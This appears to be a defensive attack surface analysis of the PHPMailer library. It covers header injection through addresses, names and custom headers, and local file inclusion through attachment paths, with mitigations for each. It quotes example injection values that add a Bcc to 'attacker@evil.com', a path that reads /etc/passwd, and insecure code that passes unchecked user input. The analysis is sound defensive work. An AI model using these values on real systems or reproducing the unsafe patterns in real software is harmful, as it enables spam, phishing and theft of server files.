# Attack Surface Analysis for phpmailer/phpmailer

## Attack Surface: [Header Injection via Email Addresses](./attack_surfaces/header_injection_via_email_addresses.md)

*   **Description:** Attackers inject arbitrary SMTP headers by including newline characters and additional header fields within email address input fields (To, Cc, Bcc, From, Reply-To).
*   **How PHPMailer Contributes:** If PHPMailer doesn't properly sanitize or escape these fields before constructing the email headers, the injected headers will be interpreted by the mail server.
*   **Example:**  Setting the `To` field to `victim@example.com\nBcc: attacker@evil.com` would add `attacker@evil.com` as a blind carbon copy recipient without the application's or the initial recipient's knowledge.
*   **Impact:** Unauthorized email sending, spam distribution, phishing campaigns, potential command execution on vulnerable mail servers (depending on server configuration).
*   **Risk Severity:** High
*   **Mitigation Strategies:**
    *   Use PHPMailer's built-in escaping functions: Utilize methods like `$mail->addAddress()`, `$mail->addCc()`, `$mail->addBcc()`, `$mail->setFrom()`, and `$mail->addReplyTo()` which automatically handle escaping for email headers.
    *   Validate email addresses: Implement strict validation of email address formats to reject those containing newline characters or other suspicious patterns.

## Attack Surface: [Header Injection via Name Fields](./attack_surfaces/header_injection_via_name_fields.md)

*   **Description:** Similar to email addresses, attackers inject arbitrary SMTP headers through the "name" part of email addresses (e.g., in `$mail->addAddress('email', 'name')` or `$mail->FromName`).
*   **How PHPMailer Contributes:** If the library doesn't properly escape the name field, malicious headers can be injected.
*   **Example:** Setting the name in `$mail->setFrom('sender@example.com', "Sender Name\nBcc: attacker@evil.com")` could inject a `Bcc` header.
*   **Impact:** Similar to email address header injection: unauthorized sending, spam, phishing.
*   **Risk Severity:** High
*   **Mitigation Strategies:**
    *   Use PHPMailer's built-in escaping: Rely on the escaping provided by methods like `$mail->addAddress()` and `$mail->FromName`.
    *   Sanitize name input:  Strip newline characters and other potentially harmful characters from user-provided names before passing them to PHPMailer.

## Attack Surface: [Custom Header Injection](./attack_surfaces/custom_header_injection.md)

*   **Description:** Attackers inject arbitrary SMTP headers using the `$mail->addCustomHeader()` function if user input is used directly without validation.
*   **How PHPMailer Contributes:** PHPMailer directly adds the provided header without any inherent validation.
*   **Example:**  Using `$mail->addCustomHeader("X-Custom: " . $_GET['custom_header'])` with a crafted `custom_header` value could inject malicious headers.
*   **Impact:** Bypassing spam filters, manipulating email routing, potentially exposing sensitive information.
*   **Risk Severity:** High
*   **Mitigation Strategies:**
    *   Avoid using `addCustomHeader()` with user input: If absolutely necessary, implement strict validation and sanitization of the header name and value.
    *   Use specific PHPMailer methods when available:  For common headers, use dedicated PHPMailer methods instead of `addCustomHeader()`.

## Attack Surface: [Local File Inclusion via Attachment Paths](./attack_surfaces/local_file_inclusion_via_attachment_paths.md)

*   **Description:** Attackers can include arbitrary local files as attachments if the file path provided to `$mail->addAttachment()` is derived from unsanitized user input.
*   **How PHPMailer Contributes:** PHPMailer attempts to read the file from the provided path.
*   **Example:**  Using `$mail->addAttachment($_GET['file_path'])` with `file_path=/etc/passwd` would attach the contents of the `/etc/passwd` file to the email.
*   **Impact:** Exposure of sensitive server-side files.
*   **Risk Severity:** Critical
*   **Mitigation Strategies:**
    *   Never use user input directly for attachment file paths:  Store allowed file paths securely and use an identifier to retrieve the correct path.
    *   Implement strict access controls: Ensure the web server process has only the necessary permissions to access required files.

